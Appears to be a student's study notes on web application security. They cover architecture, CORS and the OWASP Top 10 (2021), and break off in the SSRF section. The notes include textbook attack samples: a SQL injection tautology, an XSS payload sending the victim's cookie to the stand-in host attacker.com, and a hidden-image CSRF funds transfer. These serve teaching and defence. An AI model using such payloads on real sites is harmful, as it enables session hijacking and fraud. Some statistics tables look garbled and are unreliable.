## Chapter 1
Test

### Web Application structure
 Usually multi-tiered approach -> often __3 tiers__
 - presentation (web browser)
 - application logic (web server
 - storage (database)![[Pasted image 20221216112016.png]]

### Server-side Architecture
####    Stand-alone Architecture
   - Web application is a stand-alone binary program
   - Program restarted for each request
####    Integrated  Architecture
   - Web application is part of the web server
   - No need to restart for each request
   - E. g. PHP, Perl, Python

### Reducing load on the Server
####    Single Page Application
   - SPA's __dynamically rewrite the current web page__ with new data from the web server (instead of loading  a complete new page)
   - Server delivers JavaScript, CSS etc. via web services, e.g REST API
   - __Calculations are performed on the client__ 
   ![[Pasted image 20221216120858.png]]
   
### HTTP Proxies
####    Forwarding
   - acts as __intermediary for clients requesting resources__ from a web server
   ![[Pasted image 20221216121124.png]]
   - _additional services_
       - Caching
       - Authentication
       - Access Control
####    Reverse
   - acts as intermediary for origin web servers to which clients connect 
   ![[Pasted image 20221216121510.png]]
   - _advantages_
       - load balancing 
       - TLS (SSL) tasks
       - protection
       - caching

## Chapter 2

### HTTP Request & Response
- .....

###  Same Origin Policy (SOP)
- web browser permits scripts contained in a first web page to access data in a second web page, but _only if both web pages have the same origin_, i.e. the same URI scheme (like http or https), host name and port number
- Third-party scripts may access user information on frontend (cookies, local storage) or backend (banking, email, network devices) => __security risk__
- Sometimes, however, pages would like to allow other pages to access their data... => __CORS__

###  Cross-origin Resource Sharing (CORS)
- is a mechanism that _allows restricted resources on a web page to be requested from another domain_ outside the domain from which the first resource was served
- CORS Headers in HTTP Requests and Resources allow server to define SOP exceptions
    - CORS Request: Origin [host name]  
    - CORS Response: Access-Control-Allow-Origin [host name]
    - ....
- Often checked using OPTIONS method before actual Request
    - so-called _CORS preflight request_ to avoid errors

### URI vs. URL vs. URN
- _Uniform Resource Identifiers (URIs)_ are a superset of => e.g  www.fh-aachen.de
    - _Uniform Resource Locators (URLs)_ => e.g  http://www.fh-aachen.de
        - Protocol://hostname[:port]/[path]file[?param=value] 
        - https://www.fh-aachen.de/auth/448/Details.ashx?uid=129
    - _Uniform Resource Names (URNs)_
        - persistent, location-independent, resource identifiers
        - one of a hundred URI schemes (“urn:”, “http:”, “ftp:” ...)

### Status Codes HTTP
- 1xx – Informational responses
- 2xx – Success  
- 3xx – Redirection  
- 4xx – Client errors
- 5xx – Server errors

## Chapter 3

### [Agenda OWASP Top 10](https://owasp.org/Top10/)
    [[#A01 - Broken Access Control]]
    [[#A02 - Cryptographic Failures  ]]
    [[#A03 - Injection]]
    [[#A04 - Insecure Design]]
    [[#A05 - Security Misconfiguration]]  
    [[#A06 - Vulnerable and Outdated Components]]  
    [[#A07 - Identification and Authentication Failures]]
    [[#A08 - Software and Data Integrity Failures]]  
    [[#A09 - Security Logging and Monitoring Failures]]
    [[#A10 - Server-Side Request Forgery (SSRF)]]
    [[#Further risks (from earlier OWASP top 10 lists)]]

### A01 - Broken Access Control 
[PDF Link](Chapter_3_WAS.pdf#page=39)
[OWASP Top ten](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

__Moving up from the fifth position__
- _94% of applications were tested_ for some form of broken access control
- _average incidence rate of 3.81%_
- most occurrences in the contributed dataset with over 318k

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  34   
Max Incidence Rate   |  55,97
Avg Incidence Rate   |  3,81%
Avg Weighted Exploit |  6.93  
Avg Weighted Impact  |  5.93
Max Coverage         |  94% 
Avg Coverage         |  47%    
Total Occurrences    |  318487 
Total CVE'S          |  19013   

- Access control enforces policy such that __users cannot act outside of their intended permissions__  
![[Pasted image 20221219120548.png|500]]
- __Failures__ typically lead to:
    - Unauthorised information disclosure, modification, or destruction of all data or
    - performing a business function outside the user's limits
#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=41)`
   - __Violation of principle of least privilege__ or __deny by default__
	   - access ***should*** only be granted for particular capabilities, roles, or users, but is available to anyone
   - __Bypassing access control checks__ by  
	   - modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or  
	   - by using an attack tool modifying API requests
   - __Permitting viewing or editing__ someone else's account,  
	   - by providing its unique identifier (insecure direct object references)
   - Accessing API with __missing access controls for POST, PUT and DELETE__
   - __Elevation of privilege__  
	   - acting as a user without being logged in or  
	   - acting as an admin when logged in as a user
   - __Metadata manipulation__, such as
	   - replaying or tampering with a JSON Web Token (JWT) access control token, or
	   - a cookie or hidden field manipulated to elevate privileges or
	   - abusing JWT invalidation
   - __CORS misconfiguration__ allows API access from unauthorized/untrusted origins
   - __Force browsing__ 
	   - to authenticated pages as an unauthenticated user or
	   - to privileged pages as a standard user

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=43)`
- _Scenario #1:_ The application uses unverified data in a SQL call that is accessing account information:
``` php
pstmt.setString(1, request.getParameter(“acct”)); ResultSet results = pstmt.executeQuery();
```
An attacker simply __modifies the ‘acct’ parameter in the browser to send whatever account number they want__. If not properly verified, the attacker can access any user’s account.
	http://example.com/app/accountInfo?acct=notmyacct

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=44)`
- __Deny by default__
- __Enforce record ownership__
- __Input validation__
- __functional access control unit and integration tests__

#####    Insecure Direct Object References
   - Attacker changes account id in Url to get acces to other accounts
	   - ?acct=6065 -> 6064
   - __Avoid__
	   - Use acces reference maps
	   - Use salted hash to replace direct ID
#### References
[PDF Link](Chapter_3_WAS.pdf#page=49)

### A02 - Cryptographic Failures 
[PDF Link](Chapter_3_WAS.pdf#page=52)
[OWASP Top ten](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)

__Shifting up one position to 2__
- previously known as Sensitive Data Exposure,
	- which is more of a broad symptom rather than a root cause
- focus is on failures related to cryptography (or lack thereof), which often lead to exposure of sensitive data

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  29   
Max Incidence Rate   |  46,44%
Avg Incidence Rate   |  4,49%
Avg Weighted Exploit |  7,29  
Avg Weighted Impact  |  6,81
Max Coverage         |  79,33%
Avg Coverage         |  34,85%    
Total Occurrences    |  233788 
Total CVE'S          |  3075   

#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=54)
##### Which data needs extra protection?
- Is any Data transmitted in __clear text__?
- Are any __old or weak cryptographic algorithms__ or protocols used
- Are __default crypto__ keys in use
- Is received server __cert__ and trust chain properly __validated__?
- Is __randomness__ used for cryptographic purposes that was not designed to meet cryptographic requirements?
- Are __deprecated hash functions__ such as MD5 or SHA1 in use
- 

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=57)
_Scenario #1:_ An application encrypts credit card numbers in a database using _automatic database encryption._ However, this data is _automatically decrypted when retrieved,_ allowing a SQL injection flaw to retrieve credit card numbers in _clear text._ Alternatives include not storing credit card numbers, using tokenization, or using public key encryption.

##### Illustrated 
![[Pasted image 20230115140103.png]]

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=60)
- __Classify data__ processed, stored, or transmitted by an application. __Identify data sensitive according to privacy laws__, regulatory requirements, or business needs.
- __Don't store sensitive data unnecessarily.__
- __Disable caching__ for responses that contain sensitive data
- Store passwords using __strong adaptive and salted hashing functions__
- __Keys should be generated cryptographically randomly__

#### References
[PDF Link](Chapter_3_WAS.pdf#page=62)

### A03 - Injection 
[PDF Link](Chapter_3_WAS.pdf#page=65)
[OWASP Top ten](https://owasp.org/Top10/A03_2021-Injection/)

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  33  
Max Incidence Rate   |  19,09%
Avg Incidence Rate   |  3,37%
Avg Weighted Exploit |  7,25  
Avg Weighted Impact  |  7,15
Max Coverage         |  94% 
Avg Coverage         |  47,90%    
Total Occurrences    |  274228 
Total CVE'S          |  32078   

- __Injection flaws occur when an application sends untrusted data to an interpreter__
- An application is vulnerable to attack when:
	- __User-supplied data is not validated__, filtered, or sanitized by the application
	- Dynamic queries or __non-parameterized calls without context-aware escaping__ are used directly in the interpreter
	- __Hostile data__ is used _within object-relational mapping (ORM) search parameters_ to extract additional, sensitive records
	- __Hostile data is directly used__ or concatenated
		- SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures


#### How to find vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=68)
 1. __Static code analysis__
	 - Can often be automated as part of Continuous Integration (CI) builds
	 - Manual code reviews are effective, but are much less efficient
	 - Manual code reviews are encouraged to augment static analysis, especially on critical areas of the application
 2. __Dynamic analysis__
	 - _Vulnerability scanning_ often misses injection flaws that are buried deep in the application
	 - _Penetration testers_ can validate vulnerabilities by building exploits
	 - Poor error handling makes injection flaws easier to discover (for you and the bad guys)

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=69)
- _Scenario #1:_ An application uses untrusted data in the construction of the following vulnerable SQL call:
``` SQL
String query = “SELECT * FROM accounts WHERE custID=‘” + request.getParameter(“id”) + “’”;
```
- _Result_:  
``` SQL
SELECT * FROM accounts WHERE custID=‘’ or ‘1’=‘1’
```

##### Illustrated 
![[Pasted image 20230115140235.png]]

#### SQL Injection Types [PDF Link](Chapter_3_WAS.pdf#page=71)
1. __In-band__ SQL Injection
	- attacker uses the same channel of communication to launch their attacks and to gather their results
		- _error-based_: the attacker performs actions that cause the database to produce error messages and potentially uses the data provided by these error messages to gather information about the structure of the database
		- _union-based_: takes advantage of the UNION SQL operator, which fuses multiple select statements generated by the database to get a single HTTP response; this response may contain data that can be leveraged by the attacker
1. __Blind__ (Inferential) SQL Injection
	- attacker sends data to the server and observes the response and behavior of the server to learn more about its structure
2. __Out-of-band__ SQL Injection
	- certain features must be enabled on the database server
	- performed when the attacker can’t use the same channel to launch the attack and gather information, or when a server is too slow or unstable for these actions to be performed
#### Cross-Site Scripting (XSS) [PDF Link](Chapter_3_WAS.pdf#page=73)
##### Example Attack
The application uses untrusted data in the construction of the following HTML snippet _without validation or escaping_:
``` Javascript
(String) page += "input name= 'creditcard' 
	type= 'TEXT'
	value=' + request.getParameter ("CC" ) 
	+ "'>";
```
The attacker _modifies the ‘CC’ parameter_ in his browser to: 
``` Javascript
'script>document.location=
	'http://www.attacker.com/cgi-bin/cookie.cgi
	?foo='+document.cookie‹/script>'
```
_Result_: 
``` Javascript
(String) page += "input name= 'creditcard' 
	type= 'TEXT'
	value=\'><script>document.location=
	'http://www.attacker.com/cgi-bin/cookie.cgi
	?foo='+document.cookie</script›'">";
```
Causes the _victim’s session ID to be sent to the attacker’s_ web-site, allowing attacker to _hijack the user’s current session_

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=75)
__Preventing injection requires keeping untrusted data separate from commands and queries (interpreters)__
- Use safe _APIs which avoid the use of interpreters_, provide a _parameterized interface_, or migrate to _Object Relational Mapping Tools_ (ORMs)
- _White List_
- _Use LIMIT and other SQL controls_ within queries to prevent mass disclosure of records in case of SQL injection
- For any residual dynamic queries, _escape special characters using the specific escape syntax for that interpreter_

#### References
[PDF Link](Chapter_3_WAS.pdf#page=78)

### A04 - Insecure Design
[PDF Link](Chapter_3_WAS.pdf#page=81)
[OWASP Top ten](https://owasp.org/Top10/A04_2021-Insecure_Design/) 

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  40  
Max Incidence Rate   |  24,19%
Avg Incidence Rate   |  3,00%
Avg Weighted Exploit |  6.46  
Avg Weighted Impact  |  6,78
Max Coverage         |  77% 
Avg Coverage         |  42%    
Total Occurrences    |  262407 
Total CVE'S          |  2691   

Broad category representting different weaknesses, expressed as _“missing or ineffective control design”_

__Difference between insecure design and insecure implementation__
- we differentiate between design flaws and implementation defects for a reason, they have _different root causes and remediation_
- _a secure design can still have implementation defects_ leading to vulnerabilities that may be exploited
- _an insecure design cannot be fixed by a perfect implementation_ as by definition, needed security controls were never created to defend against specific attacks

__One of the factors that contribute to insecure design__
- is the lack of _business risk profiling_ inherent in the software or system being developed,
- and thus the _failure to determine what level of security design is required_ ![[Pasted image 20230115120716.png]]

#### Requirements and resource management [PDF Link](Chapter_3_WAS.pdf#page=84)
- _Collect and negotiate the business requirements for an application with the business_
	- including the protection requirements concerning confidentiality, integrity, availability, and authenticity of all data assets and the expected business logic
- _Take into account how exposed your application will be and if you need segregation of tenants_
	- additionally to access control
- _Compile the technical requirements_
	- including functional and non-functional security requirements
- _Plan and negotiate the budget covering all design, build, testing, and operation_
	- including security activities

#### Secure Design [PDF Link](Chapter_3_WAS.pdf#page=85)

<center><strong>Secure design is neither an add-on nor a tool that you can add to software</strong></enter>

- _Threat modeling_ should be integrated into refinement sessions (or similar activities)
	- look for changes in data flows and access control or other security controls
- In the _user story development determine the correct flow and failure states,_ ensure they are well understood and agreed upon by responsible and impacted parties
- Analyze assumptions and conditions _for expected and failure flows,_ ensure they are still accurate and desirable
- Determine _how to validate_ the assumptions and enforce conditions needed for proper behaviors
- Ensure the _results are documented in the user story_
- _Learn from mistakes_ and offer positive incentives to promote improvements

#### Secure Development Lifecycle (SDL) [PDF Link](Chapter_3_WAS.pdf#page=87)
- Secure software requires a secure development lifecycle, some form of secure design pattern, paved road methodology*, secured component library, tooling, and threat modeling
- Reach out for your security specialists at the beginning of a software project throughout the whole project and maintenance of your software
- Consider leveraging the OWASP Software Assurance Maturity Model (SAMM) to help structure your secure software development efforts

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=88)
__Scenario #1:__ 
	A _credential recovery workflow might include “questions and answers,”_ which is prohibited by NIST 800- 63b, the OWASP ASVS, and the OWASP Top 10
	- Questions and answers cannot be trusted as evidence of identity as more than one person can know the answers, which is why they are prohibited
	- Such code should be removed and replaced with a more secure design

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=91)
- __Establish and use a secure development lifecycle__ with AppSec professionals to help evaluate and design security and privacy-related controls
- __Establish and use a library of secure design patterns__ or paved road ready to use components
- Use __threat modeling for critical authentication__, access control, business logic, and key flows
- Integrate __security language and controls into user stories__
- Integrate __plausibility checks__ at each tier of your application (from frontend to backend)
- __Write unit and integration tests__ to validate that all critical flows are resistant to the threat model
	- compile use-cases and misuse-cases for each tier of your application
- __Limit resource consumption by user or service__

#### References
[PDF Link](Chapter_3_WAS.pdf#page=92)

### A05 - Security Misconfiguration 
[PDF Link](Chapter_3_WAS.pdf#page=95)
[OWASP Top ten](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) 

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  20   
Max Incidence Rate   |  19,84%
Avg Incidence Rate   |  4,51%
Avg Weighted Exploit |  8,12  
Avg Weighted Impact  |  6,56
Max Coverage         |  89,58% 
Avg Coverage         |  44%    
Total Occurrences    |  208387
Total CVE'S          |  789

It is commonly a result of __insecure default configurations__, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information

#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=97)
- __Missing appropriate security hardening__ across any part of the application stack or improperly configured permissions on cloud services 
- __Unnecessary features are enabled__ or installed (e.g., unnecessary ports, services, pages, accounts, or privileges)
- __Default accounts and their passwords are still enabled__ and unchanged 
- __Error handling reveals stack traces__ or other overly informative error messages to users
- For upgraded systems, the __latest security features are disabled__ or not configured securely
- The __security settings__ in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., __are not set to secure values__
- The server __does not send security headers__ or directives, or they are not set to secure values
- __The software is out of date__ or vulnerable (see A06:2021- Vulnerable and Outdated Components)
- 
#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=99)
_Scenario #1:_
	Application server comes with _sample applications (not removed from the production server)._ Sample applications have _known security flaws_ attackers use to compromise the server. 
	- If one of these applications is the admin console, and default accounts weren’t changed the attacker logs in with default passwords and takes over

#### XML External Entities (XXE) [PDF Link](Chapter_3_WAS.pdf#page=102)
##### What is XXE
- XML standard allows DTDs (Document Type Definitions)
	- meant to define the expected structure of an XML document
	- DTDs may define entities
- Entities are XML shortcuts for special characters, strings, URIs, and more: __“&entity;”__
##### Use cases
- DoS Attack
- access „external entities“ like files
- Access can be extended to files not local…
	- if attackers now location and structure of web application
	- e.g. using HTTP requests (note: we are behind firewall)
##### How to prevent XXE
- __Developer Training!__
- __Patch or upgrade all XML processors and libraries in use__. Use dependency checkers. Update SOAP to SOAP 1.2 or higher.
- __Disable XML external entity and DTD processing__ in all XML parsers in the application
- __Implement positive ("whitelisting")__ server-side input validation, filtering, or sanitization to prevent hostile data

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=110)
- __Hardening process__
	- repeatable hardening process makes it fast and easy to deploy another environment that is properly locked down 
	- development, QA, and production environments should all be configured identically (with different passwords used in each environment) 
	- this process should be automated to minimize the effort required to setup a new secure environment
	- Minimal platform 
	- remove all unnecessary features and frameworks
- __Minimal platform__
	- remove all unnecessary features and frameworks
- __Review and update configurations__
- __Segmentation__
	- secure separation between components or tenants (segmentation, containerization, or cloud security groups)
- __Client security directives__
	- e.g., sending security headers
- __Automated verification process__

#### References
[PDF Link](Chapter_3_WAS.pdf#page=112)

### A06 - Vulnerable and Outdated Components 
[PDF Link](Chapter_3_WAS.pdf#page=115)
[OWASP Top ten](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)  

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  3  
Max Incidence Rate   |  27,97
Avg Incidence Rate   |  8,77%
Avg Weighted Exploit |  51%  
Avg Weighted Impact  |  22,47%
Max Coverage         |  5 
Avg Coverage         |  5    
Total Occurrences    |  30,457 
Total CVE'S          |  0   

- Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application
- If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover
- Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts

#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=117)
##### You are likely vulnerable if you do NOT…
- __know the versions of all components you use__ (both clientside and server-side). This includes components you directly use as well as nested dependencies.
- __know about the software being vulnerable, unsupported, or out of date__ 
	- this includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries 
- __scan for vulnerabilities regularly__ and subscribe to security bulletins related to the components you use
- fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion
	- this commonly happens in environments when patching is a monthly or quarterly task under change control, leaving organizations open to days or months of unnecessary exposure to fixed vulnerabilities
- test the compatibility of updated, upgraded, or patched libraries (as software developers)
- secure the components’ configurations (see [[#A05 - Security Misconfiguration]])

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=119)
_Components typically run with the same privileges as the application, so flaws in any component can result in serious impact._ Such flaws can be accidental (e.g., coding error) or intentional (e.g., backdoor in). 
Example exploitable component vulnerabilities are:

- CVE-2017-5638, a Struts 2 __remote code execution vulnerability that enables execution of arbitrary code on the server,__ has been blamed for significant breaches. 
- __While internet of things (IoT) are frequently difficult or impossible to patch, the importance of patching them can be great__ (e.g,. biomedical devices).

__There are automated tools to help attackers find unpatched or misconfigured systems__. For example, the Shodan IoT search engine can help you find devices that still suffer from the Heartbleed vulnerability that was patched in April 2014.

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=121)
##### Establish patch management process:
- __Remove unused dependencies, unnecessary features, components, files, and documentation__
- __Continuously inventory the versions__ of both client-side and server-side components (e.g., frameworks, libraries) and their dependencies using tools like versions, OWASP Dependency Check, retire.js, etc. 
- __Only obtain components from official sources over secure links__
- __Monitor for libraries and components that are unmaintained__ or do not create security patches for older versions

#### References
[PDF Link](Chapter_3_WAS.pdf#page=124)

### A07 - Identification and Authentication Failures
[PDF Link](Chapter_3_WAS.pdf#page=127)
[OWASP Top ten](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  10   
Max Incidence Rate   |  16,67%
Avg Incidence Rate   |  2%
Avg Weighted Exploit |  6.94  
Avg Weighted Impact  |  7,94
Max Coverage         |  75% 
Avg Coverage         |  45%    
Total Occurrences    |  47972 
Total CVE'S          |  1152   

<center><strong>Allows attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently</strong></center>


#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=129)
##### There may be authentication weaknesses if the application:
- permits automated attacks such as __credential stuffing, where the attacker has a list of valid usernames and passwords__
- permits __brute force__ or other automated attacks
- permits __default, weak, or well-known passwords__, such as "Password1" or "admin/admin"
- __uses weak or ineffective credential recovery and forgotpassword processes,__ such as "knowledge-based answers," which cannot be made safe
- __uses plain text, encrypted, or weakly hashed passwords data stores__ (see A02:2021-Cryptographic Failures)
- has __missing or ineffective multi-factor authentication__
- __exposes session identifier in the URL__
- __reuse session identifier__ after successful login.
- does not correctly __invalidate Session IDs__ 
	- sser sessions or _authentication tokens (mainly single sign-on (SSO) tokens) aren't properly invalidated during logout_ or a period of inactivity
#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=131)
__Scenario #1:__ 
	A travel reservations application supports URL rewriting, putting session IDs in the URL:
		 http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN 2JV?dest=Hawaii --> what is the problem? 
__Scenario #2:__ 
	Most authentication attacks occur due to the __continued use of passwords as a sole factor.__ Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and __use multi-factor authentication.__

##### Illustrated 
![[Pasted image 20230115140637.png]]



#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=133)
- Where possible, __implement multi-factor authentication__
	- prevents automated credential stuffing, brute force, and stolen credential re-use attacks
- __Do not ship or deploy with default (admin) credentials__ 
- Implement __weak-password checks__ (e.g. top 10000) 
- __Password length, complexity and rotation policies __
- Ensure __registration, credential recovery, and API pathways are hardened against account enumeration attacks__ by using the same messages for all outcomes 
- __Limit or increasingly delay failed login attempts__ 
- __log all failures__ and alert administrators when attacks are detected 
- __Use server-side, secure, built-in session manager __
	- random session IDs, not in URL, securely stored, invalidated

#### References
[PDF Link](Chapter_3_WAS.pdf#page=134)

### A08 - Software and Data Integrity Failures 
[PDF Link](Chapter_3_WAS.pdf#page=137)
[OWASP Top ten](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  22   
Max Incidence Rate   |  14,84%
Avg Incidence Rate   |  2,55%
Avg Weighted Exploit |  7,40 
Avg Weighted Impact  |  6,5
Max Coverage         |  79,51% 
Avg Coverage         |  45%    
Total Occurrences    |  132195
Total CVE'S          |  3897   

<center><strong>Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations</strong></center>

#### Examples [PDF Link](Chapter_3_WAS.pdf#page=138)
- an application __relies upon plugins, libraries, or modules from untrusted sources__, repositories, and content delivery networks (CDNs)
- an __insecure CI/CD pipeline__ can introduce the potential for unauthorized access, malicious code, or system compromise
- many __applications now include auto-update__ functionality, where updates are downloaded __without sufficient integrity verification__ and applied to the previously trusted application
	- attackers could potentially upload their own updates to be distributed and run on all installations
- objects or data __are encoded or serialized into a structure that an attacker can see and modify__
	- such an application is vulnerable to insecure deserialization

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=140)
__Scenario #1:__ 
	_Update without signing:_ Many home routers, settop boxes, device firmware, and others do not verify updates via signed firmware 
		- unsigned firmware is a growing target for attackers and is expected to only get worse
		- major concern as many times there is no mechanism to remediate other than to fix in a future version and wait for previous versions to age out
__Scenario #2:__ 
	SolarWinds malicious update: Nation-states have been known to attack update mechanisms, with a recent notable attack being the SolarWinds Orion attack
		- the company that develops the software had secure build and update integrity processes
		- still, these (update integrity processes) were able to be subverted, and for several months, the firm distributed a highly targeted malicious update to more than 18,000 organizations, of which around 100 or so were affected
		- this is one of the most far-reaching and most significant breaches of this nature in history

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=143)
- __Use digital signatures__ or similar mechanisms to __verify the software or data__ is from the expected source and has not been altered 
- __Ensure libraries and dependencies are consuming trusted repositories__ 
	- examples: npm (javascript package manager) or Maven (build automation tool for Java projects)
	- if you have a higher risk profile, consider hosting an internal knowngood repository that's vetted
- __Ensure that a software supply chain security tool is used__ to verify that components do not contain known vulnerabilities 
	- examples: OWASP Dependency Check (software composition analysis tool) or OWASP CycloneDX (lightweight Software Bill of Materials (SBOM) standard)
- __Ensure that there is a review process for code and configuration changes__ to minimize the chance that malicious code or configuration could be introduced into your software pipeline
- __Ensure that your CI/CD pipeline has proper segregation, configuration, and access control__ to ensure the integrity of the code flowing through the build and deploy processes
- __Ensure that unsigned or unencrypted serialized data is not sent to untrusted client__ without some form of integrity check or digital signature to detect tampering or replay of the serialized data

#### References
[PDF Link](Chapter_3_WAS.pdf#page=145)

### A09 - Security Logging and Monitoring Failures 
[PDF Link](Chapter_3_WAS.pdf#page=148)
[OWASP Top ten](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  4  
Max Incidence Rate   |  19,23%
Avg Incidence Rate   |  6,52%
Avg Weighted Exploit |  6.87  
Avg Weighted Impact  |  4,99
Max Coverage         |  53% 
Avg Coverage         |  39%    
Total Occurrences    |  53615
Total CVE'S          |  242   

<center><strong>This category is to help detect, escalate, and respond to active breaches</strong></center>

#### Common vulnerabilities [PDF Link](Chapter_3_WAS.pdf#page=149)
##### Insufficient logging, detection, monitoring, and active response occurs any time:
- __auditable events__, such as logins, failed logins, and highvalue transactions, __are not logged__
- __warnings and errors generate no, inadequate, or unclear log messages__ 
- __logs__ of applications and APIs are __not monitored for suspicious activity__
- __logs are only stored locally__
- appropriate __alerting thresholds and response escalation processes are not in place or effective__ 
- pentesting and __scans by dynamic application security testing (DAST) tools__ (such as OWASP ZAP) __do not trigger alerts__
- the application __cannot detect, escalate, or alert for active attacks in real-time or near real-time__
#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=151)
__Scenario #1:__ 
	A children's health plan provider's website operator couldn't detect a breach due to a lack of monitoring and logging
		- an external party informed the health plan provider that an attacker had accessed and modified thousands of sensitive health records of more than 3.5 million children
		- a post-incident review found that the website developers had not addressed significant vulnerabilities 
		- as there was no logging or monitoring of the system, the data breach could have been in progress since 2013, a period of more than seven years

<center><strong>Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring</strong></center>

#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=155)
##### Developers should implement some or all the following controls, depending on the risk of the application:
- __ensure all login, access control, and server-side input validation failures can be logged__ with sufficient user context __to identify suspicious or malicious accounts__ and held for enough time to allow delayed forensic analysis 
- ensure that __logs are generated in a format that log management solutions can easily consume__
- ensure __log data is encoded correctly__ to prevent injections or attacks on the logging or monitoring systems. 
- ensure __high-value transactions have an audit trail with integrity control__ to prevent tampering or deletion, such as append-only database tables or similar 
- DevSecOps teams should establish __effective monitoring and alerting such that suspicious activities are detected and responded to quickly__ 
- __establish or adopt an incident response and recovery plan__, such as NIST 800-61r2 or later.

#### References
[PDF Link](Chapter_3_WAS.pdf#page=156)

### A10 - Server-Side Request Forgery (SSRF)
[PDF Link](Chapter_3_WAS.pdf#page=159)
[OWASP Top ten](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

Type                 |  Rate
-------------------- | -------
CWE's Mapped         |  1   
Max Incidence Rate   |  2,72%
Avg Incidence Rate   |  2,72%
Avg Weighted Exploit |  8,28  
Avg Weighted Impact  |  6,72
Max Coverage         |  67% 
Avg Coverage         |  67%    
Total Occurrences    |  9503
Total CVE'S          |  385   

<center><strong>SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL</strong></center>

It allows an attacker to force the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list

#### Cross-Site Request Forgery (CSRF) [PDF Link](Chapter_3_WAS.pdf#page=161)
__Forces:__
- a logged-on victim’s browser to send a forged HTTP request
- including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application
Such an attack allows the attacker to __force a victim’s browser to generate requests__ the vulnerable application thinks are legitimate requests from the victim

##### Example Attack [PDF Link](Chapter_3_WAS.pdf#page=163)
The application allows a user to submit a state changing request that does not include anything secret. For example: 
	http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243 
So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:
``` HTML
<img src="(http://example.com/app/transferFunds?
	amount=1500&destinationAccount=attackersAcct#)"!
	width="0" HEIGHT="0" />
```
If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.

###### Illustrated
![[Pasted image 20230115140717.png]]


##### How Do I Prevent CSRF? [PDF Link](Chapter_3_WAS.pdf#page=164)
- __Use an existing CSRF defense__
	- many frameworks now include built in CSRF defenses, such as Spring, Play, Django, and AngularJS
- __inclusion of an unpredictable token in each HTTP request__

##### Avoiding CSRF Flaws [PDF Link](Chapter_3_WAS.pdf#page=165)
- __Add secret, not autom. submitted token to ALL sensitive requests__
	- This makes it impossible for the attacker to spoof the request
		- (unless there’s an XSS hole in your application) 
	- Tokens should be cryptographically strong or random

#### Procedure [PDF Link](Chapter_3_WAS.pdf#page=166)
- The attacker will try to __send a request to a back-end service that is not reachable from the Internet Generally,__ this server is in a secure area __behind a Firewall__, and an exception may be granted to the web application to allow it to communicate with the server. The attacker will take advantage of the trust relationship that the back -end service places in the vulnerable application
![[Pasted image 20230115135015.png]]

#### Example Attacks [PDF Link](Chapter_3_WAS.pdf#page=167)
__Scenario #1:__ Port scan internal servers 
	- If the network architecture is unsegmented, attackers can map out internal networks and determine if ports are open or closed on internal servers 
	- Achieved by analyzing connection results or elapsed time to connect or reject SSRF payload connections
__Scenario #2:__ Sensitive data exposure
	Attackers can access local files or internal services to gain sensitive information such as
